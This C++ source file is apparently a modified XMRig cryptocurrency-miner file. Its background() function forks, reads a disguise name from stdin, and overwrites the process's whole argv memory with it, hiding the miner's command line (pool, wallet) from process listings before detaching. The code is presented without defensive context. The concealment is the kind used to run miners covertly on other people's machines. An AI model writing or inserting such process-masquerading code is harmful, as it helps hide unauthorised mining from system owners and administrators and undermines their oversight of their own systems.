/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2024 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2024 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <cstdlib>
#include <csignal>
#include <cerrno>
#include <unistd.h>
#include <iostream>


#include "App.h"
#include "base/io/log/Log.h"
#include "core/Controller.h"
#include "core/config/Config.h"


bool xmrig::App::background(int &rc)
{
    if (!m_controller->isBackground()) {
        return false;
    }

    int i = fork();
    if (i < 0) {
        rc = 1;
        return true;
    }

    if (i > 0) {
        rc = 0;
        return true;
    }

    // In child process: hide arguments
    if (m_argc > 0 && m_argv != nullptr) {
        char buffer[256] = {0};
        const char *hidden = "xmrig";
        //ssize_t len = 0;

        // Try to read the first line from stdin
        if (isatty(STDIN_FILENO) == 0) { // Only read if not a terminal
            if (fgets(buffer, sizeof(buffer), stdin) != nullptr) {
                // Remove trailing newline if present
                char *newline = strchr(buffer, '\n');
                if (newline) *newline = '\0';
                if (buffer[0] != '\0') {
                    hidden = buffer;
                }
            }
        }

        // Find the start of argv[0] and the end of the last argv
        char *start = m_argv[0];
        char *end = m_argv[m_argc - 1] + strlen(m_argv[m_argc - 1]);
        size_t total_len = end - start;
        // Zero out the whole region
        memset(start, '\0', total_len);
        // Copy as much of the hidden string as fits
        size_t hidden_len = strlen(hidden);
        if (hidden_len > total_len) hidden_len = total_len;
        strncpy(start, hidden, hidden_len);
    }

    if (setsid() < 0) {
        LOG_ERR("setsid() failed (errno = %d)", errno);
    }

    return false;
}
